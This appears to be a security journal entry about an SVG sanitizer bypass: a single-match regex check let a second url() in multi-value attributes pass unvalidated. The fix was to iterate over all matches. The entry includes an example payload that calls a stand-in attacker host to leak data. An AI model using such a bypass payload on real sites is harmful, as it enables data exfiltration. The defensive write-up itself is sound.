## 2025-05-18 - SVG Multi-URL Sanitizer Bypass

**Vulnerability:** SVG attribute sanitizer previously used single-match `RegExp.exec()` when checking `url(...)` functions in attribute values, allowing secondary `url(...)` functions in multi-value attributes (such as `filter="url(#f) url(https://evil.example/leak)"`) to bypass validation and attempt external requests.

**Learning:** When validating string patterns that can occur multiple times within a single attribute or input string (like CSS/SVG function lists), `RegExp.exec()` or single-match checks only inspect the first occurrence, leaving subsequent matches unvalidated.

**Prevention:** Always iterate through all matches (using `matchAll` or global regex iteration) when validating multi-occurrence patterns in attribute values, ensuring every match meets safety criteria.
